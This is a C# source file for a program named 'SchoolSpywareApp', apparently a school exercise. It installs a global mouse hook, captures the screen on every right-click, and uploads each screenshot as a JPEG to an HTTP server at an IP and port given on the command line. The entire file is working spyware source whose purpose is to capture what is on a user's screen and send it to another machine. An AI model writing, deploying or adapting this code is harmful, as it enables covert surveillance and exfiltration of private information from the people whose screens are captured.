﻿using SchoolLibrary;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;
using Gma.System.MouseKeyHook;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using Newtonsoft.Json;

namespace SchoolSpywareApp
{
    internal class Program
    {
        private static HttpClient _httpClient = new HttpClient();

        static void Main(string[] args)
        {
            if(args.Length != 1 || !args[0].Contains(':'))
            {
                string programName = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
                Console.WriteLine("Usage: {0} <ip>:<port>", programName);
                return;
            }
            
            var fields = args[0].Split(':');
            
            string ipAddress = fields[0];
            int port = Int32.Parse(fields[1]);

            UriBuilder uriBuilder = new UriBuilder
            {
                Scheme = "http",
                Host = ipAddress,
                Port = port,
                Path = "api/image"
            };

            IKeyboardMouseEvents globalMouseHook = Hook.GlobalEvents();
            globalMouseHook.MouseDown += (sender, e) =>
            {
                if(e.Button == MouseButtons.Right)
                {
                    Console.WriteLine(uriBuilder.Uri);

                    Bitmap bitmap = ImageLib.CaptureScreen();

                    SendImage(bitmap, uriBuilder.Uri);
                }
            };

            Application.Run();
        }

        private static async void SendImage(Bitmap bitmap, Uri requestUri)
        {
            string json = JsonConvert.SerializeObject(new { time = DateTime.Now });
            StringContent jsonContent = new StringContent(json, Encoding.UTF8);
            jsonContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/json");

            byte[] imageBytes;

            using (MemoryStream memoryStream = new MemoryStream())
            {
                bitmap.Save(memoryStream, ImageFormat.Jpeg);
                imageBytes = memoryStream.ToArray();
            }

            ByteArrayContent imageContent = new ByteArrayContent(imageBytes);

            MultipartFormDataContent multipartContent = new MultipartFormDataContent();
            multipartContent.Add(jsonContent, "json", "info.json");
            multipartContent.Add(imageContent, "bitmap", "image.jpg");

            var response = await _httpClient.PostAsync(requestUri, multipartContent);

            Console.WriteLine(response);
            Console.WriteLine(await response.Content.ReadAsStringAsync());
        }
    }
}
